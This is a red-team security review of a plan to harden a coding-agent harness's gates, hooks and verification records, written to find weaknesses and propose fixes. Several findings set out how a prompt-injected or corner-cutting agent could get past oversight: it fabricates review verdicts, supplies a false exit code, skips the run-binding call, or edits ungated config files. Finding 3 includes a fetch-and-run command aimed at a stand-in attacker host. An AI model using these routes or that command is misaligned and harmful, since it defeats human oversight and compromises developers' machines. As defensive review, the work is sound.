# Red-Team Security Review: Harness Execution-Loop Hardening Plan

Reviewer role: security adversary. Target: `plans/260710-2246-harness-execution-loop-hardening/` (plan.md + phase-01..07). Codebase under change: `meowkit/`.

## Findings

## Finding 1: No privilege separation — every "hardened" gate is self-attested by the same agent it constrains
- **Severity:** Critical
- **Location:** Phase 1 "Architecture" + step 6; Phase 2 step 2/3; plan.md Overview.
- **Flaw:** The whole loop (`activate-run`, verification-required, RESULT recording, review verdicts) is designed to be produced by "explicit, copy-pasteable CLI call" instructions inside skill prose (phase-01 step 6), executed by the same coding-agent session that the gates exist to constrain. Nothing in Phases 1–2 introduces an out-of-band actor, signature, or human checkpoint that distinguishes "the agent asserts it verified" from "verification actually happened."
- **Failure scenario:** A prompt-injected or corner-cutting agent turn writes `tasks/plans/x/plan.md`, calls `mewkit state activate-run --plan-path tasks/plans/x --plan-slug x`, writes `tasks/reviews/000000-x-evalverdict.md` with a fabricated "APPROVED" decision, and calls `mewkit state record-result --exit-code 0`. Every gate in Phases 1–2 (Gate 1 slug-binding, pre-completion verdict parsing, Gate 2) is satisfied without any real plan review, code review, or test execution — because all three artifact classes (`tasks/plans/*`, `tasks/reviews/*`, and the new `session-state/active-run.json`) are writable by that same agent with no independent authority.
- **Evidence:** `.claude/hooks/gate-enforcement.sh:89-91` (`tasks/plans/*`, `tasks/reviews/*`, `tasks/contracts/*` all unconditionally allowed — no Gate 1 check applies to them); `.claude/hooks/pre-completion-check.sh:126-131` (verdict "check" today is filename-existence only: `for f in tasks/reviews/[0-9]*-"$SLUG"-evalverdict.md`); phase-01:63 ("Each skill gets an explicit, copy-pasteable CLI call"); phase-02 step 2 ("Gate 1: ... require the newest plan and slug match with active-run").
- **Suggested fix:** State plainly that this is a corner-cutting/drift defense, not an adversarial-agent defense, or add an actual authority boundary (e.g., a separate reviewer credential, signed verdict, or CI-computed RESULT that the interactive agent cannot author itself).

## Finding 2: RESULT envelope's `exit_code`/`artifact_hash` have no specified trusted computation path
- **Severity:** Critical
- **Location:** Phase 1, "Architecture" (RESULT schema) and step 4/6.
- **Flaw:** The RESULT envelope schema (`{..., command, exit_code, artifact_hash, ...}`) is defined as data the `record-result` CLI call writes, but no implementation step specifies that the CLI itself executes `command` and captures its real exit code/hashes real output — it reads as parameters supplied by whoever calls the CLI (the agent, per Finding 1). This is exactly the "self-reported verification as proof" pattern the plan's own Out-of-Scope section forbids.
- **Failure scenario:** Skill prose instructs the agent to run tests, then call `mewkit state record-result --exit-code 0 --artifact-hash <value>`. An agent that skips or fails the tests can still supply `--exit-code 0` and any hash string; pre-completion (Phase 2 step 3) accepts "RESULT envelope with `exit_code == 0` and matching scope" as evidence, with no cross-check against an actual artifact.
- **Evidence:** phase-01:39-45 (schema definition, no provenance field), phase-01:63 (CLI-call-from-skill design); plan.md:61 lists "self-reported verification as proof" under Out of Scope ("audit §6/§10 do not copy"); phase-02:41 ("evidence = RESULT envelope with `exit_code == 0` ... "). Contrast with the codebase's own correct pattern for trustworthy hashing: `packages/mewkit/src/wiki/handoff/service.ts:149` (`createHash("sha256").update(content).digest("hex")` computed from real content inside the CLI, never passed in by a caller).
- **Suggested fix:** `record-result` must itself invoke/inspect the verification command (or hash a file it reads directly), never accept `exit_code`/`artifact_hash` as trusted CLI arguments from the calling skill.

## Finding 3: Phase 4's data-driven capability "probe command" is a command-injection vector via an already-ungated write path
- **Severity:** Critical
- **Location:** Phase 4, "Related Code Files" / step 4 ("external-tool capability entries (probe command per tool, e.g. `command -v`, version check)").
- **Flaw:** Phase 4 proposes storing a probe command *per tool entry* in `.claude/harness-inventory.json` (a data file), later executed by `inventory --probe`. `.claude/*` writes are completely exempt from Gate 1 — any agent turn can edit this file with zero plan/approval friction. If the probe field is a shell string rather than an allowlisted enum mapped to a hardcoded table, this reintroduces exactly the risk the codebase's existing pattern avoids.
- **Failure scenario:** A prompt-injected agent (e.g., steered by hostile content in a fetched doc) edits `.claude/harness-inventory.json` to add/alter an artifact's `probe` field to `curl attacker.example/x | sh`. The change is never blocked (no Gate 1 applies to `.claude/`), and later `inventory --probe` (run by a human dev or CI) shells it out.
- **Evidence:** `.claude/hooks/gate-enforcement.sh:93` (`.claude/*|*/.claude/*) exit 0 ;;` — unconditional allow); `.claude/harness-inventory.json` (509 lines, current entries carry only `owner/criticality/status/runtime/responsibility`, confirming probe/capability fields are new surface, not already-reviewed data); existing safe precedent the plan should follow instead: `packages/mewkit/src/commands/doctor-checks.ts:284-290` — `execSync` there only ever runs commands from a **hardcoded** `dep.detectCommand`/`detectCommands` table, never data read from a project-editable file.
- **Suggested fix:** Probe commands must come from a hardcoded in-CLI table keyed by tool name (mirroring `doctor-checks.ts`), never from a string field inside `harness-inventory.json`; if inventory must reference a tool, it references a table key, not an executable string.

## Finding 4: `--acknowledge-degraded-enforcement` is an unscoped, permanent bypass
- **Severity:** High
- **Location:** Phase 3, step 3 ("Loss policy").
- **Flaw:** The flag is described as a single boolean gate on the whole migrate run ("migrate exits non-zero ... unless `--acknowledge-degraded-enforcement` is passed"). Nothing scopes the acknowledgement to the specific registrations dropped at the time it was granted (e.g., a hash/allowlist of acknowledged losses). Once anyone adds this flag to a script, alias, or CI job, it silently blesses every future critical-enforcement loss too — including ones introduced by later, unreviewed changes to `settings.json`.
- **Failure scenario:** A CI pipeline hits the new non-zero exit once, an engineer adds `--acknowledge-degraded-enforcement` to unblock it, and the flag stays in the CI script permanently. Six months later a new hard-enforcement hook is added to `settings.json` and dropped on conversion — the loss policy is satisfied silently by the stale flag, defeating the golden-fixture drift detection Phase 3 exists to add.
- **Evidence:** phase-03:41 (flag description, no per-registration scoping mentioned); phase-03 Success Criteria (`[ ] Migrating to a provider that loses Gate 1/privacy enforcement fails without the acknowledge flag`) — phrased as a one-time binary gate, not a per-drop ledger.
- **Suggested fix:** Require the acknowledgement to reference the exact set/hash of dropped registrations (e.g., `--acknowledge-degraded-enforcement=<fingerprint>`); any new drop not covered by the fingerprint still fails.

## Finding 5: Gate 1's binding is opt-in by construction — an agent that skips the producer call gets the old, weak gate for free
- **Severity:** High
- **Location:** Phase 2, step 2 and Risk Assessment ("Over-strict gates block legitimate quick fixes").
- **Flaw:** Phase 2 explicitly keeps "the no-active-run fallback path (existence check)" when `active-run.json` is absent. Since Phase 1's own Risk Assessment concedes producers are "prose-executed by the model (skills can be skipped)," any agent flow that never calls `state activate-run` automatically reverts to today's trivially-satisfied "any plan file exists" check — the exact weakness the plan sets out to fix.
- **Failure scenario:** An agent under time pressure (or steered by injected instructions to "skip planning overhead") never invokes `activate-run`. Gate 1 falls back to "a plan file exists" and is satisfied by any stale/unrelated plan already on disk, identical to pre-plan behavior — the "hardening" adds zero enforcement floor for this path while giving the impression (via docs/success criteria) that stale/wrong-slug plans are now blocked.
- **Evidence:** phase-02:58 ("keep the no-active-run fallback path... only bind strictly when a run is active"); phase-01:80 ("Producers are prose-executed by the model (skills can be skipped)"); current weak check reproduced at `.claude/hooks/gate-enforcement.sh:113-119` (`for _plan in tasks/plans/*/plan.md tasks/plans/*.md; do ... gate1_passed=1`).
- **Suggested fix:** Either make `activate-run` itself a required side effect of something the agent cannot skip (e.g., emitted by the SessionStart/PreToolUse hook chain rather than skill prose), or downgrade the Phase 2 success criterion to state the strict binding is best-effort, not a floor.

## Finding 6: Gate deny messages leak raw, unnormalized absolute filesystem paths into model context/logs
- **Severity:** Medium
- **Location:** Phase 2, Requirements ("deny messages actionable and product-name-free") and step 2/3 (new deny messages for scope mismatch/verdict parse failure).
- **Flaw:** Phase 2's message-honesty requirement covers wording accuracy and product-name neutrality but never addresses path scrubbing. The existing contract-validation deny message already echoes the *raw* `$FILE_PATH` (not the `NORMALIZED_PATH` computed two lines earlier specifically to strip `$CLAUDE_PROJECT_DIR`), so absolute host paths (potentially containing OS usernames/home directories) can appear in hook stderr fed back into the transcript. Phase 2 adds more deny paths (scope mismatch, verdict parse failure) without a stated requirement to use normalized paths.
- **Failure scenario:** A contract file fails validation while the project lives under `/Users/alice/client-work/acme-corp/...`; the deny message `"Contract file $FILE_PATH failed schema validation."` echoes that full path into the session transcript/log, which may be shared, screen-recorded, or logged to a less-trusted sink than the repo itself.
- **Evidence:** `.claude/hooks/gate-enforcement.sh:40-45` (NORMALIZED_PATH computed) vs. `:59-60` (`echo "Contract file $FILE_PATH failed schema validation."` uses raw `$FILE_PATH`, not the normalized variable).
- **Suggested fix:** Add "use `NORMALIZED_PATH` (never raw `$FILE_PATH`/absolute paths) in all deny/echo output" as an explicit Phase 2 requirement, and audit existing messages for the same defect while the file is being modified anyway.

## Finding 7: "Grep-verified" producer wiring checks prove text presence, not reachability — phantom verification risk
- **Severity:** Medium
- **Location:** Phase 2 step 5 (hook-manifest/`HOOKS_INDEX.md` drift check); Phase 5 step 5 ("the drift validator verifies the referenced skills actually contain that instruction (grep-verified, same technique as the hook-manifest producer check)").
- **Flaw:** Both the hook-manifest CI check and the command-registry drift check validate "wiring" by grepping skill markdown for the presence of a CLI-call string. A string match cannot distinguish an unconditional, always-executed instruction from one buried in a commented-out example, an alternate/legacy code path, or a conditional branch the model never reaches at runtime. This gives CI a green check while runtime behavior is unverified — the same "polished but unproven" pattern the plan otherwise explicitly guards against (Phase 7 step 6: "agent/self-reported pass is never accepted as proof").
- **Failure scenario:** A skill author adds `mewkit state activate-run ...` inside an example block (` ``` `-fenced sample usage) to satisfy the drift check, but the actual imperative instruction the model follows during real runs never calls it. CI stays green; the runtime producer is still missing, silently reproducing this plan's original Phase 1 problem (documented producers with zero real writers) inside the very mechanism meant to prevent recurrence.
- **Evidence:** phase-02:43 ("CI fails when manifest drifts from `settings.json`/`handlers.json` or when a documented producer has no write site (grep-verified)"); phase-05:40 ("the drift validator verifies the referenced skills actually contain that instruction (grep-verified..."); this exact class of prior failure is what phase-01:20 documents already happened once: `plan-creator/step-08b-html-render.md:37` "explicitly forbids resolving plans from `session-state/active-plan`" despite being documented as a producer.
- **Suggested fix:** Grep-verification should require the call to appear inside a designated "mandatory step" markdown structure (e.g., a specific heading/checklist item), not anywhere in the file, and Phase 7's E2E drills (scenario 1) should be the actual proof of reachability — call that out explicitly as the closing loop for this exact gap, not just an implicit side effect.

## Verification Results

| # | Claim | Result | Evidence |
|---|-------|--------|----------|
| 1 | `pre-completion-check.sh` exits 0 when `verification-required.json` absent (phase-01:18) | VERIFIED | `.claude/hooks/pre-completion-check.sh:50-53` |
| 2 | `session-state/active-plan.json`/`verification-required.json` are untracked leftover fixtures, not producer output (phase-01:14) | VERIFIED | `.gitignore:43` (`session-state/`), `git log` empty for those paths, files present on disk untracked |
| 3 | Gate 1 default passes if any `tasks/plans/*/plan.md` exists; deny message says "No approved plan found" (phase-02:18) | VERIFIED | `.claude/hooks/gate-enforcement.sh:113-131` |
| 4 | `MEOWKIT_GATE1_REQUIRE_APPROVED` env-gated, default off, unset in settings.json env block (phase-02:19) | VERIFIED | `.claude/settings.json:2-11` (no such key); `.claude/hooks/gate-enforcement.sh:148` (`${MEOWKIT_GATE1_REQUIRE_APPROVED:-0}`) |
| 5 | 22 hook registrations in `settings.json`, PreToolUse Edit\|Write group carries `gate-enforcement.sh` + `privacy-block.sh` | VERIFIED | `.claude/settings.json:49-64` |
| 6 | Codex `allowedMatchers: ["Bash"]` for PreToolUse drops Edit\|Write/Read groups (phase-03:14/18) | VERIFIED | `packages/mewkit/src/migrate/providers/codex/capabilities.ts:94` (`allowedMatchers: ["Bash"]` under PreToolUse) |
| 7 | Codex `Stop` event fully supported, no matcher restriction | VERIFIED | `packages/mewkit/src/migrate/providers/codex/capabilities.ts:119-121` (`Stop: { supported: true, supportsAdditionalContext: false }`, no `allowedMatchers`) — confirms `pre-completion-check.sh` (Stop) is NOT among the 7 dropped registrations |
| 8 | `SAFETY_HOOK_NAMES` never-prune list hardcoded to 2 entries (`gate-enforcement.sh`, `privacy-block.sh`) | VERIFIED | `packages/mewkit/src/migrate/hooks/hooks-settings-merger.ts:35-36` |
| 9 | `.claude/*` writes unconditionally allowed, bypassing Gate 1 (used in Finding 3) | VERIFIED | `.claude/hooks/gate-enforcement.sh:93` |
| 10 | `tasks/reviews/*` and `tasks/plans/*` writes unconditionally allowed (used in Finding 1) | VERIFIED | `.claude/hooks/gate-enforcement.sh:89-90` |
| 11 | Pre-completion verdict check is filename-existence only, not content parsing (phase-02:21) | VERIFIED | `.claude/hooks/pre-completion-check.sh:126-131` |
| 12 | `doctor-checks.ts` probe commands come from a hardcoded table, not project-editable data (used in Finding 3) | VERIFIED | `packages/mewkit/src/commands/doctor-checks.ts:284-290` |
| 13 | Existing precedent for trustworthy hash: computed from real content inside CLI (used in Finding 2) | VERIFIED | `packages/mewkit/src/wiki/handoff/service.ts:149` |
| 14 | `build-inventory.ts` `ArtifactType` currently 5 values (phase-04:18) | VERIFIED | `packages/mewkit/src/core/build-inventory.ts:14` |
| 15 | `.claude/harness-inventory.json` entries currently lack capability/producer/consumer/enforcement/probe fields (phase-04:19) | VERIFIED | `.claude/harness-inventory.json:1-30` sample (fields: `owner, criticality, status, runtime, responsibility` only) |
| 16 | Plan explicitly lists "self-reported verification as proof" as an audit do-not-copy item (used in Finding 2) | VERIFIED | `plans/260710-2246-harness-execution-loop-hardening/plan.md:61` |
| 17 | Contract-validation deny message uses raw `$FILE_PATH`, not `NORMALIZED_PATH` (Finding 6) | VERIFIED | `.claude/hooks/gate-enforcement.sh:40, 59-60` |

## Unresolved Questions

- Whether Phase 1's `state` CLI is intended to run verification commands itself (closing Finding 2) or remain a pure state-recorder trusting caller-supplied fields — the phase file does not say, and the fix depends on which.
- Whether Finding 1's self-attestation gap is accepted as out-of-scope threat model (corner-cutting/drift only, not adversarial agents) — if so, the plan's language ("hardening," "make enforcement... honest") should say so explicitly rather than implying gates resist a misbehaving agent.
